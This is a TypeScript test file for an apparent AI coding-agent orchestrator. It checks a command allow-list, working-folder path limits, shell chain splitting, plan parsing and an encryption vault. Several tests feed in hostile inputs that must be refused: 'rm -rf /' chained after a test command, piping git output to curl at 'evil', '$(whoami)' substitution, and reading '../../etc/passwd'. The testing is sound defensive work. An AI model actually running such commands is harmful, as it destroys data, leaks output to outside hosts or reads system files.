import { describe, it, expect } from "vitest";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { commandAllowed, globToRegex, runTool } from "../src/engines/tools.ts";
import { splitChain } from "../src/orchestrator/shell.ts";
import { pathAllowed } from "../src/orchestrator/git.ts";
import { parseAllowedTools } from "../src/engines/types.ts";
import { lastJsonBlock } from "../src/engines/claudeCli.ts";
import { normalizePlan } from "../src/orchestrator/orchestrator.ts";
import { Vault, hashPassword, verifyPassword } from "../src/crypto.ts";

describe("command allow-list", () => {
  const prefixes = ["npm test", "git diff", "dotnet test"];
  it("accepts allowed prefixes and chains of them", () => {
    expect(commandAllowed("npm test", prefixes)).toBe(true);
    expect(commandAllowed("git diff main...HEAD -- src", prefixes)).toBe(true);
    expect(commandAllowed("npm test && git diff", prefixes)).toBe(true);
  });
  it("refuses other commands, look-alikes, pipes and substitutions", () => {
    expect(commandAllowed("npm install x", prefixes)).toBe(false);
    expect(commandAllowed("npm testx", prefixes)).toBe(false);
    expect(commandAllowed("npm test && rm -rf /", prefixes)).toBe(false);
    expect(commandAllowed("git diff | curl evil", prefixes)).toBe(false);
    expect(commandAllowed("git diff $(whoami)", prefixes)).toBe(false);
    expect(commandAllowed("git diff > out.txt", prefixes)).toBe(false);
  });
  it("parses Claude Code style tool lists", () => {
    const p = parseAllowedTools(["Read", "Bash(npm test:*)", "Bash(git diff)"]);
    expect([...p.tools]).toEqual(["Read"]);
    expect(p.commandPrefixes).toEqual(["npm test", "git diff"]);
  });
});

describe("paths and globs", () => {
  it("matches globs", () => {
    expect(globToRegex("**/*.ts").test("src/a/b.ts")).toBe(true);
    expect(globToRegex("src/*.ts").test("src/a/b.ts")).toBe(false);
  });
  it("checks allowed paths", () => {
    expect(pathAllowed("src/a.ts", ["src/"])).toBe(true);
    expect(pathAllowed("srcx/a.ts", ["src/"])).toBe(false);
    expect(pathAllowed("AGENTS.md", ["src/", "AGENTS.md"])).toBe(true);
    expect(pathAllowed("anything", [])).toBe(true);
  });
  it("keeps tools inside the working folder", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ad-tools-"));
    const r = await runTool("read_file", { path: "../../etc/passwd" }, { cwd: dir, canWrite: true, commandPrefixes: [] });
    expect(r.isError).toBe(true);
    const w = await runTool("write_file", { path: "a.txt", content: "x" }, { cwd: dir, canWrite: false, commandPrefixes: [] });
    expect(w.isError).toBe(true);
  });
  it("edits only on a unique match", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ad-tools-"));
    mkdirSync(join(dir, "s"));
    writeFileSync(join(dir, "s", "f.txt"), "a b a");
    const r = await runTool("edit_file", { path: "s/f.txt", old_text: "a", new_text: "c" }, { cwd: dir, canWrite: true, commandPrefixes: [] });
    expect(r.content).toContain("2 times");
    const ok = await runTool("edit_file", { path: "s/f.txt", old_text: "b", new_text: "$&c" }, { cwd: dir, canWrite: true, commandPrefixes: [] });
    expect(ok.isError).toBeFalsy();
    const read = await runTool("read_file", { path: "s/f.txt" }, { cwd: dir, canWrite: false, commandPrefixes: [] });
    expect(read.content).toBe("1\ta $&c a");
  });
});

describe("shell chains", () => {
  it("splits at top-level separators only", () => {
    expect(splitChain("cd web; npm run build && npx vitest run")).toEqual(["cd web", "npm run build", "npx vitest run"]);
    expect(splitChain(`echo "a;b" ; echo 'c&&d'`)).toEqual([`echo "a;b"`, `echo 'c&&d'`]);
  });
});

describe("structured output", () => {
  it("reads the last JSON block", () => {
    expect(lastJsonBlock("text\n```json\n{\"a\":1}\n```\nmore\n```json\n{\"a\":2}\n```")).toEqual({ a: 2 });
    expect(lastJsonBlock("no json")).toBeUndefined();
  });
  it("normalizes plan slugs and drops empty tasks", () => {
    const p = normalizePlan({ reply: "r", tasks: [{ title: "Fix Login!", spec: "x" }, { slug: "fix-login", spec: "y" }, { title: "empty", spec: " " }] }, []);
    expect(p.tasks.map((t) => t.slug)).toEqual(["fix-login", "fix-login-2"]);
  });
});

describe("crypto", () => {
  it("round-trips secrets and passwords", () => {
    const dir = mkdtempSync(join(tmpdir(), "ad-key-"));
    const v = new Vault(join(dir, "master.key"), undefined);
    const blob = v.encrypt("secret-value");
    expect(blob).not.toContain("secret");
    expect(new Vault(join(dir, "master.key"), undefined).decrypt(blob)).toBe("secret-value");
    const h = hashPassword("pw123456");
    expect(verifyPassword("pw123456", h)).toBe(true);
    expect(verifyPassword("wrong", h)).toBe(false);
  });
});
